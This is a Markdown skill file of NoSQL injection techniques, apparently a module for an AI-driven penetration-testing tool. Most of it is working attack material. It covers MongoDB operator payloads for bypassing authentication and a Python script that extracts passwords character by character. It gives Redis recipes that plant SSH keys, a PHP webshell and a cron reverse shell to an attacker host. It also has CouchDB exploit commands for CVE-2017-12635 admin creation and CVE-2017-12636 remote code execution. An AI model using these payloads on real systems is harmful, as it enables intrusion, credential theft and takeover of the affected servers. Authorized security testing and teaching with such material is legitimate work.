<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: nosql-injection
description: NoSQL injection testing — MongoDB operator injection, authentication bypass, blind injection, Redis command injection, and CouchDB exploitation techniques
---

# NoSQL Injection

NoSQL injection = inject operators into JSON/BSON queries to bypass authentication, extract data, or execute commands. Most common: MongoDB `$ne`, `$gt`, `$regex`, `$where`.

---

## MongoDB Injection

### Authentication Bypass

    # Login form sends: {"username": "admin", "password": "secret"}

    # Method 1: $ne operator (not equal) — bypass password:
    # HTTP POST (JSON body):
    {"username": "admin", "password": {"$ne": ""}}
    # OR:
    {"username": "admin", "password": {"$gt": ""}}

    # URL-encoded (application/x-www-form-urlencoded):
    username=admin&password[$ne]=invalid
    username=admin&password[$gt]=a
    username[$ne]=xxx&password[$ne]=xxx   # Bypass both fields

    # GET parameter:
    GET /api/users?username[$ne]=xxx&password[$ne]=xxx

    # If using JSON:
    {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}

### Operator Injection

    # Available operators:
    $eq, $ne, $gt, $gte, $lt, $lte    # Comparison
    $in, $nin                          # Array membership
    $regex                             # Regular expression match
    $where                             # JavaScript evaluation (dangerous!)
    $exists                            # Field existence

    # Extract data with $regex (blind/semi-blind):
    # Test if username starts with 'a':
    {"username": {"$regex": "^a"}, "password": {"$ne": ""}}
    {"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
    # Continue until full username recovered

    # $where JavaScript injection (if enabled — disabled in MongoDB 4.4+):
    {"$where": "this.username == 'admin' && sleep(2000)"}    # Time-based blind
    {"$where": "function() { return this.username == 'admin' }"}

### Automated Tool — nosqlmap

    # Install: pip install nosqlmap --break-system-packages
    # OR: git clone https://github.com/codingo/NoSQLMap /home/pentester/tools/nosqlmap
    python3 /home/pentester/tools/nosqlmap/nosqlmap.py

    # nosqli (simpler tool):
    # pip install nosqli --break-system-packages
    nosqli -u "http://target.com/login" -p "username=admin&password=INJECT"

### PHP-specific NoSQL Injection

    # PHP arrays in form data:
    # POST: username=admin&password[%24ne]=invalid
    # PHP receives: $_POST['password'] = ['$ne' => 'invalid']
    # MongoDB query: {username: "admin", password: {$ne: "invalid"}}

---

## MongoDB Direct Exploitation (If Port 27017 Exposed)

    # Check if MongoDB is exposed:
    nmap -p 27017 <target> -sV

    # Connect (no auth by default on older versions):
    mongo <target>:27017
    # OR:
    mongosh <target>:27017

    # MongoDB shell commands:
    show dbs                          # List databases
    use admin                         # Switch database
    show collections                  # List collections
    db.users.find()                   # Dump all users
    db.users.find({}, {username:1, password:1})  # Specific fields
    db.users.find().limit(10)         # First 10 records
    db.getUsers()                     # Get DB users (admin DB)

    # With credentials:
    mongosh "mongodb://admin:password@<target>:27017/admin"

---

## Redis Command Injection (via SSRF or Direct Access)

If Redis is exposed or reachable via SSRF:

    # Direct access (no auth):
    redis-cli -h <target> -p 6379

    # Redis commands:
    INFO                              # Server info, version
    KEYS *                            # List all keys
    GET <key>                         # Get value
    CONFIG GET dir                    # Working directory
    CONFIG GET dbfilename             # DB filename

    # Redis RCE — write SSH key:
    redis-cli -h <target>
    > CONFIG SET dir /root/.ssh/
    > CONFIG SET dbfilename authorized_keys
    > SET key "\n\nssh-rsa AAAA...<attacker_pubkey>...\n\n"
    > BGSAVE

    # Redis RCE — write webshell (if web root known):
    > CONFIG SET dir /var/www/html/
    > CONFIG SET dbfilename shell.php
    > SET key "<?php system($_GET['cmd']); ?>"
    > BGSAVE

    # Redis RCE via cron:
    > CONFIG SET dir /var/spool/cron/crontabs/
    > CONFIG SET dbfilename root
    > SET key "\n\n* * * * * bash -i >& /dev/tcp/<attacker>/4444 0>&1\n\n"
    > BGSAVE

---

## CouchDB Exploitation

    # Discovery:
    nmap -p 5984 <target>

    # CouchDB API (no auth by default on older versions):
    curl http://<target>:5984/           # Version info
    curl http://<target>:5984/_all_dbs   # List databases
    curl http://<target>:5984/_users/_all_docs   # List users
    curl http://<target>:5984/<db>/_all_docs     # All documents

    # CVE-2017-12635 — Admin account creation (no auth):
    curl -X PUT http://<target>:5984/_users/org.couchdb.user:hacker \
      -H "Content-Type: application/json" \
      -d '{"type":"user","name":"hacker","password":"hacker","roles":["_admin"],"_id":"org.couchdb.user:hacker"}'

    # CVE-2017-12636 — RCE via query_servers:
    curl -X PUT http://admin:admin@<target>:5984/_config/query_servers/cmd \
      -d '"bash -i >& /dev/tcp/<attacker>/4444 0>&1"'
    # Trigger: create a design doc with map function

---

## Blind NoSQL Injection (Response-Based)

    # Boolean-based: different response for true vs false condition
    # True condition (admin exists):
    {"username": "admin", "password": {"$ne": "xxx"}}  # → login success

    # False condition:
    {"username": "admin", "password": "wrongpassword"}  # → login fail

    # Extract field character by character with $regex:
    python3 -c "
    import requests, string

    url = 'http://target.com/login'
    charset = string.printable

    def check(regex):
        r = requests.post(url, json={'username': 'admin', 'password': {'\$regex': regex}})
        return 'Welcome' in r.text  # Adjust success indicator

    password = ''
    while True:
        found = False
        for c in charset:
            if check(f'^{password}{c}'):
                password += c
                print(f'Password so far: {password}')
                found = True
                break
        if not found:
            print(f'Final password: {password}')
            break
    "

---

## Pro Tips

1. Try `password[$ne]=x` in URL-encoded forms — many developers forget to sanitize array input
2. `$regex` operator enables character-by-character data extraction (like SQL LIKE)
3. MongoDB without auth on port 27017 = full database dump in seconds
4. Redis write access → SSH key injection or webshell = reliable RCE path
5. CouchDB CVE-2017-12635 admin creation is still valid on many unpatched instances
6. If `$where` works → JavaScript eval = time-based blind injection via `sleep()`

## Summary

NoSQL injection = operator injection in JSON: `{"password": {"$ne": ""}}` bypasses auth. MongoDB: try `$ne`, `$gt`, `$regex` operators in login forms. Direct MongoDB on 27017 (no auth) = dump all databases immediately. Redis on 6379 = write SSH key for RCE. CouchDB = check CVE-2017-12635 admin creation endpoint.
